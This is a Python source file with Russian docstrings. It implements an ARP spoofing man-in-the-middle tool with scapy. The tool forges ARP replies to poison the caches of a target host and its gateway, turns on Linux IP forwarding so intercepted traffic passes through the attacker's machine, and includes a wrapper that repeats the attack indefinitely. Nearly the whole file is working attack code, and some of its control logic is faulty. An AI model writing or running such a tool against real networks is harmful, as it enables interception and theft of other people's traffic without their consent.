from multiprocessing import Manager
from threading import Thread
import time
from time import sleep
from scapy.all import Ether, ARP, srp, send


class ArpSpoofing:
    def __init__(
            self,
            ip_target=str,
            ip_gateway=str,
            verbose=bool
    ):
        """
        ip_target - IP адрес цели спуфинга, должен быть строкой
        ip_gateway - IP адрес шлюза, должен быть строкой
        verbose - вывод в консоль, должен быть True/False
        """
        self.data = Manager().dict()
        self.data['stop'] = False
        self.data['target'] = ip_target
        self.data['gateway'] = ip_gateway
        self.data['verbose'] = verbose

    def start_spoofing(self):
        """Запускает спуфинг экземпляра класса arp_spoofing"""
        try:
            init_spoofing = Thread(
                target=self.init_spoof,
                args=(
                    self.data['target'],
                    self.data['gateway'],
                    self.data['verbose']
                )
            )
            init_spoofing.start()
        except Exception as Error:
            raise ArpSpoofingError(Error, "Ошибка запуска потока")

    def stop_spoofing(self):
        """
        Функция останавливает спуфинг цели и возвращает сеть в исходное состояние
        """

        self.data['stop'] = True
        self.restore(
            self.data['target'],
            self.data['gateway'],
            self.data['verbose']
        )
        self.restore(
            self.data['gateway'],
            self.data['target'],
            self.data['verbose']
        )
        self.linux_iproute(0)

    def init_spoof(self, ip_target, ip_gateway, verbose):
        """
        Инициализатор спуфинга. Запускает основную функцию в бесконечном режиме до вызова функции остановки
        """

        self.linux_iproute(1)
        try:
            if self.data['stop'] is False:
                self.spoof(ip_target, ip_gateway, verbose)
                self.spoof(ip_gateway, ip_target, verbose)
                time.sleep(1)
        except Exception as Error:
            self.stop_spoofing()
            raise ArpSpoofingError(Error, "Ошибка спуфинга цели")

    def linux_iproute(self, data=int):
        """
        Включение/Выключение функции IP Forward в ОС Linux
        1 - включена
        0 - выключена
        """

        file_path = "/proc/sys/net/ipv4/ip_forward"
        if data == 0 or data == 1:
            with open(file_path) as f:
                if f.read() == data:
                    return
            with open(file_path, "w") as f:
                print(data, file=f)
        else:
            raise ArpSpoofingError("Неверно указано значение", "Ошибка IP Forward")

    def get_mac(self, ip):
        """
        Возвращает mac-адрес устройства по его IP
        """
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src

    def spoof(self, target_ip, host_ip, verbose):
        """
        Спуффинг цели. Подмена кэша arp.
        """
        target_mac = self.get_mac(target_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
        send(arp_response, verbose=0)
        if verbose:
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

    def restore(self, target_ip, host_ip, verbose):
        """
        Восстановление связи между целью и шлюзом
        """

        target_mac = self.get_mac(target_ip)
        host_mac = self.get_mac(host_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        send(arp_response, verbose=0, count=7)
        if verbose:
            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


class ArpSpoofingError(Exception):
    def __init__(self, Error, Message=str):
        self.name = Message
        self.text = Error
        super().__init__(self.name, self.text)

# You write OOP-code? What is IT?
def do_arp_spoofing(shared_memory, ip_target=str, ip_gateway=str, verbose=bool):
    arp_attack = ArpSpoofing(ip_target, ip_gateway, verbose)
    try:
        while True:
            sleep(1)
            arp_attack.start_spoofing()
    except Exception as Error:
        print(Error.name)
        print(Error.text)
